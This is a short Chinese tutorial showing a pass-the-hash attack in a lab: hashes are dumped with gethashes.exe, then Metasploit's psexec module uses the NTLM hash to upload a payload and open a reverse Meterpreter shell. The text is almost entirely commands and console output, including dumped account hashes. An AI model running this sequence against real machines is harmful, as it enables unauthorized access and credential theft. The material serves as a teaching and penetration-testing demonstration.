# 使用Hash直接登录Windows

首先,在本地主机（假设为目标主机）  新建一个wooyun用户,并为之设置密码,然后通过gethashes.exe获取到HASH 

```
C:\>net user wooyun test 

The command completed successfully. 

C:\>gethashes.exe $local 

1:1007:C2265B23734E0DACAAD3B435B51404EE:69943C5E63B4D2C104DBBCC15138B72B::: 

Administrator:500:0A174C1272FCBCF7804E0502081BA8AE:83F36A86631180CB9F5F53F5F45DF 

B2B::: 

Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0::: 

HelpAssistant:1000:CF88594C2AC20629EEF3D6DABD2DA92D:0FCE98570CBB9C14E8FF200353B2 

707B::: 

wooyun:1003:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537::: 

SUPPORT_388945a0:1002:AAD3B435B51404EEAAD3B435B51404EE:F9E8AE6C7229EA07EFAC12715 

F954B83::: 

**vmware_user**:1006:AAD3B435B51404EEAAD3B435B51404EE:915D1CEE456EA4DD6A8094F7CE 

094448::: 

C:\> 

```然后我再返回我的BT虚拟机(攻击者主机)使用MSF进行测试，MSF自带的PSEXEC模块具有HASH传递攻击功能 ```
root@bt:~# msfconsole 

                ##                          ###           ##    ## 

##  ##  #### ###### ####  #####   #####    ##    ####        ######   


###### # ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##   


###### # ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##   


## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##   


##   ##  #### ###   #####   #####     ##   ####   ####   #### ###   


                                      ## 

       =[ metasploit v3.7.0-release [core:3.7 api:1.0] 

+ \-- -|-=[ 684 exploits - 355 auxiliary 

+ \-- -|-=[ 217 payloads - 27 encoders - 8 nops 

       =[ svn r12536 updated 76 days ago (2011.05.04) 

Warning: This copy of the Metasploit Framework was last updated 76 days ago. 

         We recommend that you update the framework at least every other day. 

         For information on updating your copy of Metasploit, please see: 

             http://www.metasploit.com/redmine/projects/framework/wiki/Updating 

msf > use exploit/windows/smb/psexec 

msf exploit(psexec) > show options 

Module options (exploit/windows/smb/psexec): 

   Name       Current Setting  Required  Description 

   \---|-       \---|\---|\---|\---|\---|  \---|\---|--  \---|\---|\---|-- 

   RHOST                       yes       The target address 

   RPORT      445              yes       Set the SMB service port 

   SHARE      ADMIN$           yes       The share to connect to, can be an admi                                              n share 

(ADMIN$,C$,...) or a normal read/write folder share 

   SMBDomain  WORKGROUP        no        The Windows domain to use for authentic                                              ation 

   SMBPass                     no        The password for the specified username 

   SMBUser                     no        The username to authenticate as 

Exploit target: 

   Id  Name 

   --  \---|- 

   0   Automatic 

msf exploit(psexec) > set RHOST 192.168.0.254 

RHOST => 192.168.0.254 

msf exploit(psexec) > set SMBUser wooyun 

SMBUser => wooyun 

msf exploit(psexec) > set SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537                                             

SMBPass => 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537 

msf exploit(psexec) > show options 

Module options (exploit/windows/smb/psexec): 

   Name       Current Setting                                                                                                  Required 

Description 

   \---|-       \---|\---|\---|\---|\---|                                                                                                  \---|\---|--  \---|-- 

\---|\---| 

   RHOST      192.168.0.254                                                                                                    yes       The 

target address 

   RPORT      445                                                                                                              yes       Set 

the SMB service port 

   SHARE      ADMIN$                                                                                                           yes       The 

share to connect to, can be an admin share (ADMIN$,C$,...) or a n                                              ormal read/write folder share 

   SMBDomain  WORKGROUP                                                                                                        no        The 

Windows domain to use for authentication 

   SMBPass    01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537                                                no        The 

password for the specified username 

   SMBUser    wooyun                                                                                                           no        The 

username to authenticate as 

Exploit target: 

   Id  Name 

   --  \---|- 

   0   Automatic 

msf exploit(psexec) > exploit 

[*] Started reverse handler on 192.168.0.3:4444 </p> 
[</em>] Connecting to the server... 

[*] Authenticating to 192.168.0.254:445|WORKGROUP as user 'wooyun'... </p> 
[</em>] Uploading payload... 

[*] Created \UGdecsam.exe... </p> 
[</em>] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.254[\svcctl] ... 

[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.254[\svcctl] ... </p> 
[</em>] Obtaining a service manager handle... 

[*] Creating a new service (MZsCnzjn - "MrZdoQwIlbBIYZQJyumxYX")... </p> 
[</em>] Closing service handle... 

[*] Opening service... </p> 
[</em>] Starting the service... 

[*] Removing the service... </p> 
[</em>] Closing service handle... 

[*] Deleting \UGdecsam.exe... </p> 
[</em>] Sending stage (749056 bytes) to 192.168.0.254 

[*] Meterpreter session 1 opened (192.168.0.3:4444 -> 192.168.0.254:1877) at 2011-07-19 03:57:17 +0800 

meterpreter > sysinfo 

Computer        : WOOYUN-PC 

OS              : Windows XP (Build 2600, Service Pack 2). 

Architecture    : x86 

System Language : zh_CN 

Meterpreter     : x86/win32 

meterpreter > shell 

Process 4596 created. 

Channel 1 created. 

Microsoft Windows XP [Version 5.1.2600] 

(C) Copyright 1985-2001 Microsoft Corp. 

C:\WINDOWS\system32>net user 

net user 

User accounts for \ 

\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|\---|- 

**vmware_user**          1                        Administrator 

Guest                    HelpAssistant            wooyun 

SUPPORT_388945a0 

The command completed with one or more errors. 

C:\WINDOWS\system32> 

```至此,我们已经成功获得目标的CMDSHELL